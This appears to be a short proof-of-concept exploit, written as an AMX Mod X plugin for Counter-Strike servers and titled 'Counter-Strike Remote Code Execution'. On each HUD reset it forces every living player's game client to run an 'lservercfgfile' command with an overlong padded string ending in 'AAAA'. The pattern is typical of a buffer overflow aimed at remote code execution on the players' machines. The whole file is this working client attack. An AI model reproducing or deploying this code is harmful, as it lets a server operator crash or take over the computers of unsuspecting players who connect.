#include <amxmodx>

#define AUTHOR "MikeIsAStar"
#define PLUGIN "Counter-Strike Remote Code Execution"
#define VERSION "1.0"

public plugin_init() {
    register_plugin(PLUGIN, VERSION, AUTHOR)
    register_event("ResetHUD", "event_ResetHUD", "bef")
}

public event_ResetHUD(player_id) {
    if (!is_user_alive(player_id)) {
        return PLUGIN_CONTINUE
    }

    client_cmd(player_id, "lservercfgfile ^"MikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikeStarMikAAAA^";map de_nuke")

    return PLUGIN_CONTINUE
}
